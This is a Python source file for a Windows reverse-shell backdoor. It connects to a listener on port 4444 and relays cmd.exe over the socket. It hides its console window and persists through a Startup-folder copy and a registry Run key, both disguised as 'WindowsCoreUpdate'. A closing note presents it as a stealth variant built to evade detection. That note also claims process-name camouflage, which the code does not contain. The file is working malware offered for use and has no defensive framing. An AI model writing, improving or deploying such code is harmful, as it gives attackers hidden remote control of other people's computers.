import socket, subprocess, os, time, sys, random
import winreg as reg
from pathlib import Path

HOST = "127.0.0.1"
PORT = 4444
BASE_DELAY = 4
JITTER = 3

def add_persistence():
    try:
        me = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        user = os.getlogin()
        startup = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        dest = startup / "WindowsCoreUpdate.pyw"

        if not dest.exists():
            with open(dest, "wb") as f:
                f.write(open(me, "rb").read())

        # Registry Run
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WindowsCoreUpdate", 0, reg.REG_SZ, f'pythonw "{dest}"')
        reg.CloseKey(key)
    except:
        pass

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            return s
        except:
            time.sleep(BASE_DELAY + random.uniform(0, JITTER))

def main():
    if os.name == "nt":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    add_persistence()

    while True:
        try:
            sock = connect()
            p = subprocess.Popen(
                "cmd.exe",
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=True,
                universal_newlines=False,
                bufsize=0
            )

            while True:
                data = sock.recv(8192)
                if not data: break
                p.stdin.write(data)
                p.stdin.flush()

                out = p.stdout.read(8192)
                if out: sock.sendall(out)

            sock.close()
            p.terminate()
        except:
            time.sleep(BASE_DELAY + random.uniform(0, JITTER))

if __name__ == "__main__":
    main()




'''Variant 1 – Stealth + basic anti-forensics + startup persistence
Main changes compared to the original version:

Added startup folder + registry Run key persistence (two methods)
Hides console window more reliably (even without --noconsole)
Added small random jitter to reconnect delay (helps evade simple time-based detection)
Changed process name camouflage attempt (renames itself if possible)
Uses pythonw.exe style execution hint in persistence'''